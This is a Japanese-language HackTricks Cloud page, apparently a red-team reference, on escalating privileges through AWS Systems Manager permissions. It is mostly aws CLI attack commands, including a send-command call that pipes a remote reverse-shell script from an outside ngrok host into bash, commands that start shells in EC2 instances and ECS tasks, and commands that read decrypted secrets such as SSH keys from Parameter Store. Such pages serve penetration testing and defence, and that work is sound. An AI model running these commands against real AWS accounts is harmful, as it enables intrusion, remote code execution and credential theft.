# AWS - SSM Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## SSM

SSMについての詳細は以下をチェックしてください:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

**`ssm:SendCommand`** の権限を持つ攻撃者は、Amazon SSMエージェントを実行しているインスタンスで**コマンドを実行し**、その中で実行されているIAMロールを**侵害する**ことができます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"

# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在的な影響：** SSMエージェントが実行されているEC2インスタンスにアタッチされたIAMロールへの直接的な権限昇格。

### `ssm:StartSession`

**`ssm:StartSession`** の権限を持つ攻撃者は、Amazon SSMエージェントを実行しているインスタンス内で**SSHのようなセッションを開始**し、その中で実行されている**IAMロールを侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
**潜在的な影響：** SSMエージェントが実行されているEC2インスタンスにアタッチされたIAMロールへの直接的な権限昇格。

#### ECSへの権限昇格

**ECSタスク**が**`ExecuteCommand`が有効**に設定されている場合、十分な権限を持つユーザーは`ecs execute-command`を使用してコンテナ内で**コマンドを実行**できます。\
[**ドキュメント**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)によると、これは“_exec_”コマンドを開始するデバイスとターゲットコンテナの間にセキュアなチャネルを作成することで行われます。\
したがって、`ssm:StartSession`権限を持つユーザーは、そのオプションが有効になっているECSタスク内でシェルを**取得**できます。次のコマンドを実行するだけです：
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (55).png>)

**潜在的影響：** `ExecuteCommand` が有効になっている実行中のタスクにアタッチされた `ECS` IAM ロールへの直接的な権限昇格。

### `ssm:ResumeSession`

**`ssm:ResumeSession`** の権限を持つ攻撃者は、Amazon SSM エージェントが実行されているインスタンス内で**切断された** SSM セッション状態を再開し、SSH のようなセッションを**開始**して、その中で実行されている **IAM ロールを侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在的影響：** SSMエージェントが実行中でセッションが切断された状態のEC2 IAMロールに直接privescします。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

これらの権限を持つ攻撃者は、**SSMパラメーター**をリストし、**クリアテキストで読む**ことができます。これらのパラメーターには、SSHキーやAPIキーなどの**機密情報が頻繁に含まれています**。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**潜在的影響：** パラメータ内の機密情報を見つける。

### `ssm:ListCommands`

この権限を持つ攻撃者は、送信されたすべての**コマンド**をリストし、そこに**機密情報**が含まれていることを期待できます。
```
aws ssm list-commands
```
**潜在的な影響：** コマンドライン内の機密情報を見つける。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

これらの権限を持つ攻撃者は、送信された**コマンド**をすべてリストし、生成された**出力を読む**ことができ、その中に**機密情報**があることを期待しています。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在的な影響：** コマンドラインの出力内の機密情報を見つける。

### Codebuild

SSMを使用して、ビルド中のcodebuildプロジェクト内部にアクセスすることもできます：

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
